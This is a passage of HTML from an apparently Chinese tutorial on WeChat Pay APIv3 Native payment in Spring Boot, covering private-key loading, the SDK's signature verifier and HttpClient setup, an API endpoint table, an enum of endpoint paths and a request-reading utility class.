class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="加载商户私钥"><a href="#加载商户私钥" class="headerlink" title="加载商户私钥"></a>加载商户私钥</h2><p>将下载的私钥文件apiclient_key.pem复制到项目根目录下。</p><p>我们可以使用<a href="https://pay.weixin.qq.com/wiki/doc/apiv3/wechatpay/wechatpay6_0.shtml">官方提供的 SDK</a>，帮助我们完成开发。实现请求签名的生成和应答签名的验证。</p><blockquote><p>SDK 就是 Software Development Kit 的缩写，中文意思就是“软件开发工具包”。这是一个覆盖面相当广泛的名词，可以这么说：辅助开发某一类软件的相关文档、范例和工具的集合都可以叫做“SDK”</p></blockquote><p>微信官方Java SDK地址：<a href="https://github.com/wechatpay-apiv3/wechatpay-apache-httpclient">https://github.com/wechatpay-apiv3/wechatpay-apache-httpclient</a></p><p>引入依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.wechatpay-apiv3<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>wechatpay-apache-httpclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/wechatpay-apiv3/wechatpay-apache-httpclient#%E5%A6%82%E4%BD%95%E5%8A%A0%E8%BD%BD%E5%95%86%E6%88%B7%E7%A7%81%E9%92%A5">加载商户私钥 Link</a>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@PropertySource(&quot;classpath:wxpay.properties&quot;)</span> <span class="comment">//读取配置文件</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;wxpay&quot;)</span> <span class="comment">//读取wxpay节点</span></span><br><span class="line"><span class="meta">@Data</span> <span class="comment">//使用set方法将wxpay节点中的值填充到当前类的属性中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WxPayConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 商户号</span></span><br><span class="line">    <span class="keyword">private</span> String mchId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 商户API证书序列号</span></span><br><span class="line">    <span class="keyword">private</span> String mchSerialNo;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 商户私钥文件</span></span><br><span class="line">    <span class="keyword">private</span> String privateKeyPath;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// APIv3密钥</span></span><br><span class="line">    <span class="keyword">private</span> String apiV3Key;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// APPID</span></span><br><span class="line">    <span class="keyword">private</span> String appid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 微信服务器地址</span></span><br><span class="line">    <span class="keyword">private</span> String domain;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收结果通知地址</span></span><br><span class="line">    <span class="keyword">private</span> String notifyDomain;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取商户私钥</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> fileName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> PrivateKey <span class="title function_">getPrivateKey</span><span class="params">(String fileName)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> PemUtil.loadPrivateKey(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(fileName));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;私钥文件不存在&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试商户私钥的获取(将前面的方法改成public的再进行测试，测试私钥对象是否能够获取出来)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> top.nanzx.learn_wechatpayment.config.WxPayConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> java.security.PrivateKey;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LearnWechatPaymentApplicationTests</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> WxPayConfig wxPayConfig;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">contextLoads</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">getPrivateKey</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">privateKeyPath</span> <span class="operator">=</span> wxPayConfig.getPrivateKeyPath();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> wxPayConfig.getPrivateKey(privateKeyPath);</span><br><span class="line">        System.out.println(privateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><ul><li>如果获取的私钥只有一行短短的字符串，可以更换更高版本的jdk，运行时看第一句是在哪个jdk目录下</li><li>如果后面启动 项目报Caused by: java.io.FileNotFoundException: apiclient_key.pem (系统找不到指定的文件。)，建议将wxpay.properties的私钥路径换成绝对路径</li></ul></blockquote><h2 id="获取签名验证器和HttpClient"><a href="#获取签名验证器和HttpClient" class="headerlink" title="获取签名验证器和HttpClient"></a>获取签名验证器和HttpClient</h2><p><a href="https://github.com/wechatpay-apiv3/wechatpay-apache-httpclient#%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0%E5%B9%B3%E5%8F%B0%E8%AF%81%E4%B9%A6%E5%8A%9F%E8%83%BD"><strong>定时更新平台证书功能 Link</strong></a></p><blockquote><p>签名验证器：SDK版本&gt;&#x3D;<code>0.4.0</code>可使用 CertificatesManager.getVerifier(mchId) 得到的验签器替代默认的验签器。它可以帮助我们进行签名和验签工作，同时也会定时下载和更新商户对应的<a href="https://wechatpay-api.gitbook.io/wechatpay-api-v3/ren-zheng/zheng-shu#ping-tai-zheng-shu">微信支付平台证书</a> （默认下载间隔为UPDATE_INTERVAL_MINUTE）。我们单独将它定义出来，方便后面的开发。</p><p>HttpClient 对象：是建立远程连接的基础，我们通过SDK中配置了验签器(Verifier)的WechatPayHttpClientBuilder构造的HttpClient，会<strong>自动的处理签名和验签</strong>，并进行证书自动更新。</p><p>视频中老师使用的是<code>0.3.0</code>的ScheduledUpdateCertificatesVerifier类替代默认的验签器。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wechat.pay.contrib.apache.httpclient.WechatPayHttpClientBuilder;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@PropertySource(&quot;classpath:wxpay.properties&quot;)</span> <span class="comment">//读取配置文件</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;wxpay&quot;)</span> <span class="comment">//读取wxpay节点</span></span><br><span class="line"><span class="meta">@Data</span> <span class="comment">//使用set方法将wxpay节点中的值填充到当前类的属性中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WxPayConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 商户号</span></span><br><span class="line">    <span class="keyword">private</span> String mchId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 商户API证书序列号</span></span><br><span class="line">    <span class="keyword">private</span> String mchSerialNo;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 商户私钥文件</span></span><br><span class="line">    <span class="keyword">private</span> String privateKeyPath;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// APIv3密钥</span></span><br><span class="line">    <span class="keyword">private</span> String apiV3Key;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// APPID</span></span><br><span class="line">    <span class="keyword">private</span> String appid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 微信服务器地址</span></span><br><span class="line">    <span class="keyword">private</span> String domain;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收结果通知地址</span></span><br><span class="line">    <span class="keyword">private</span> String notifyDomain;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取商户私钥</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> fileName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> PrivateKey <span class="title function_">getPrivateKey</span><span class="params">(String fileName)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> PemUtil.loadPrivateKey(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(fileName));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;私钥文件不存在&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取签名验证器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> GeneralSecurityException</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> HttpCodeException</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> NotFoundException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean(name = &quot;verifer&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Verifier <span class="title function_">getVerifier</span><span class="params">()</span> <span class="keyword">throws</span> GeneralSecurityException, IOException, HttpCodeException, NotFoundException &#123;</span><br><span class="line">        <span class="comment">// 获取证书管理器实例</span></span><br><span class="line">        <span class="type">CertificatesManager</span> <span class="variable">certificatesManager</span> <span class="operator">=</span> CertificatesManager.getInstance();</span><br><span class="line">        <span class="comment">//获取商户私钥</span></span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> getPrivateKey(privateKeyPath);</span><br><span class="line">        <span class="comment">//私钥签名对象(签名)</span></span><br><span class="line">        <span class="type">PrivateKeySigner</span> <span class="variable">privateKeySigner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrivateKeySigner</span>(mchSerialNo, privateKey);</span><br><span class="line">        <span class="comment">//身份认证对象（验签）</span></span><br><span class="line">        <span class="type">WechatPay2Credentials</span> <span class="variable">wechatPay2Credentials</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WechatPay2Credentials</span>(mchId, privateKeySigner);</span><br><span class="line">        <span class="comment">// 向证书管理器增加需要自动更新平台证书的商户信息</span></span><br><span class="line">        certificatesManager.putMerchant(mchId, wechatPay2Credentials, apiV3Key.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        <span class="comment">// ... 若有多个商户号，可继续调用putMerchant添加商户信息</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从证书管理器中获取verifier</span></span><br><span class="line">        <span class="keyword">return</span> certificatesManager.getVerifier(mchId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取HttpClient对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> GeneralSecurityException</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> NotFoundException</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> HttpCodeException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean(name = &quot;wxPayClient&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> CloseableHttpClient <span class="title function_">getWxPayClient</span><span class="params">()</span> <span class="keyword">throws</span> GeneralSecurityException, NotFoundException, IOException, HttpCodeException &#123;</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> getPrivateKey(privateKeyPath);</span><br><span class="line">        <span class="type">Verifier</span> <span class="variable">verifier</span> <span class="operator">=</span> getVerifier();</span><br><span class="line"></span><br><span class="line">        <span class="type">WechatPayHttpClientBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> WechatPayHttpClientBuilder.create()</span><br><span class="line">                .withMerchant(mchId, mchSerialNo, privateKey)</span><br><span class="line">                .withValidator(<span class="keyword">new</span> <span class="title class_">WechatPay2Validator</span>(verifier));</span><br><span class="line">        <span class="comment">// ... 接下来，你仍然可以通过builder设置各种参数，来配置你的HttpClient</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过WechatPayHttpClientBuilder构造的HttpClient，会自动的处理签名和验签，并进行证书自动更新</span></span><br><span class="line">        <span class="keyword">return</span> builder.build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="API字典和相关工具"><a href="#API字典和相关工具" class="headerlink" title="API字典和相关工具"></a>API字典和相关工具</h2><p>Native支付模块</p><table><thead><tr><th align="left">功能列表</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_1.shtml">Native下单</a></td><td align="left">通过本接口提交微信支付Native支付订单</td></tr><tr><td align="left"><a href="https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_2.shtml">查询订单</a></td><td align="left">通过此接口查询订单状态</td></tr><tr><td align="left"><a href="https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_3.shtml">关闭订单</a></td><td align="left">通过此接口关闭待支付订单</td></tr><tr><td align="left"><a href="https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_4.shtml">Native调起支付</a></td><td align="left">商户后台系统先调用微信支付的Native支付接口，微信后台系统返回链接参数code_url，商户后台系统将code_url值生成二维码图片，用户使用微信客户端扫码后发起支付。</td></tr><tr><td align="left"><a href="https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_5.shtml">支付结果通知</a></td><td align="left">微信支付通过支付通知接口将用户支付成功消息通知给商户</td></tr><tr><td align="left"><a href="https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_9.shtml">申请退款</a></td><td align="left">商户可以通过该接口将支付金额退还给买家</td></tr><tr><td align="left"><a href="https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_10.shtml">查询单笔退款</a></td><td align="left">提交退款申请后，通过调用该接口查询退款状态</td></tr><tr><td align="left"><a href="https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_11.shtml">退款结果通知</a></td><td align="left">微信支付通过退款通知接口将用户退款成功消息通知给商户</td></tr><tr><td align="left"><a href="https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_6.shtml">申请交易账单</a></td><td align="left">商户可以通过该接口获取交易账单文件的下载地址</td></tr><tr><td align="left"><a href="https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_7.shtml">申请资金账单</a></td><td align="left">商户可以通过该接口获取资金账单文件的下载地址</td></tr><tr><td align="left"><a href="https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_8.shtml">下载账单</a></td><td align="left">通过申请交易&#x2F;资金账单获取到download_url在该接口获取到对应的账单。</td></tr></tbody></table><p>微信支付 APIv3 使用 <strong>JSON</strong> 作为消息体的数据交换格式，引入gson依赖处理json数据：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.code.gson<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>gson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="定义枚举"><a href="#定义枚举" class="headerlink" title="定义枚举"></a>定义枚举</h3><p>内容包括接口地址，支付状态等信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.enums.wxpay;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">WxApiType</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Native下单</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">NATIVE_PAY(<span class="string">&quot;/v3/pay/transactions/native&quot;</span>),</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 查询订单</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ORDER_QUERY_BY_NO(<span class="string">&quot;/v3/pay/transactions/out-trade-no/%s&quot;</span>),</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 关闭订单</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">CLOSE_ORDER_BY_NO(<span class="string">&quot;/v3/pay/transactions/out-trade-no/%s/close&quot;</span>),</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 申请退款</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">DOMESTIC_REFUNDS(<span class="string">&quot;/v3/refund/domestic/refunds&quot;</span>),</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 查询单笔退款</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">DOMESTIC_REFUNDS_QUERY(<span class="string">&quot;/v3/refund/domestic/refunds/%s&quot;</span>),</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 申请交易账单</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">TRADE_BILLS(<span class="string">&quot;/v3/bill/tradebill&quot;</span>),</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 申请资金账单</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">FUND_FLOW_BILLS(<span class="string">&quot;/v3/bill/fundflowbill&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 类型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> String type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="添加工具类"><a href="#添加工具类" class="headerlink" title="添加工具类"></a>添加工具类</h3><p>简化项目的开发：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将通知参数转化为字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readData</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            br = request.getReader();</span><br><span class="line">            <span class="keyword">for</span> (String line; (line = br.readLine()) != <span class="literal">null</span>; ) &#123;</span><br><span class="line">                <span class="keyword">if</span> (result.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    result.append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                result.append(line);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> result.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (br != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    br.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 